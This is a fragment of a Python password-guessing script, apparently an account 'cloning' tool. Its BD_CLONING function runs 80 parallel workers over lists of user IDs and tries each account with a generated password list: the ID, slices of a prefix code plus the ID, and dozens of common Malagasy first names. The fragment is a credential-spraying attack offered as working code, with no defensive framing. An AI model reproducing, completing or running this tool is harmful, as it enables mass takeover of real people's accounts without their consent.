...
def BD_CLONING():
    ...
    with tred(max_workers=80) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','tsilavina','Tsilavina','diamondra','Diamondra','lalatiana','Lalatiana','finoana','Finoana','Sarobidy','sarobidy','solofo','Solofo','Patrick','patrick','rakotomalala','Rakotomalala','narovana','Narovana','nantenaina','Nantenaina','faniry','Faniry','rakoto','Rakoto','michel','Michel','finoana','Finoana','fitiavana','Fitiavana','augustin','Augustin','finaritra','Finaritra','sahaza','Sahaza','lahatra','Lahatra','nilaina','Nilaina','mihary','Mihary','tolotra','Tolotra','mirindra','Mirindra','sarobidy','Sarobidy','fitiavana','Fitiavana','nomena','Natacha','natacha','mamitiana','Mamitiana','Nomena','nathalie','Natalie','tantely','Tantely','mamiko','Mamiko','anjara','Anjara','nathalie','Nathalie','narindra','Narindra','fandresena','harena','Harena','sitraka','Sitraka','safidy','Safidy','ravaka','Ravaka','Mialy','trading','Trading','traderfx','Traderfx','tahina','Tahina','faneva','Faneva']
